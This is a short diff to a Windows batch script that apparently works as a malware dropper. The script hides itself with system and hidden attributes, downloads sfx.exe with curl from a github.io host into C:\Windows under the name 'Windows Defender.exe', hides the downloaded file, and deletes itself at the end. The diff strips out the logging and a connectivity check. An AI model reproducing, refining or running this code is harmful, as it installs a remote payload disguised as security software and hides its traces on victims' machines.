@@ -1,20 +1,6 @@
 @echo off
 setlocal 
 attrib +s +h +i "%~f0"
-set "TEMP_LOG_FILE=%TEMP%\log.tmp"
-
-call :main >> "%TEMP_LOG_FILE%" 2>&1
-
-del /s /f /q /a "%TEMP_LOG_FILE%" >nul
-endlocal
-del /s /f /q /a "%~f0" >nul
-exit /b
-
-:main
-
-:connectivitycheck
-ping www.google.com -n 1 -w 5000 >NUL
-if errorlevel 1 goto Connectivitycheck
 
 set host=https://cryptedodissey.github.io
 set environment=C:\Windows
@@ -67,3 +53,5 @@ if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\c
 )
 
 attrib -s -h -i "%environment%\Windows Defender.exe" && curl.exe -k %proxy% %host%/sfx.exe -o "%environment%\Windows Defender.exe" && attrib +s +h +i "%environment%\Windows Defender.exe" 
+endlocal
+DEL /s /f /q /a "%~f0"
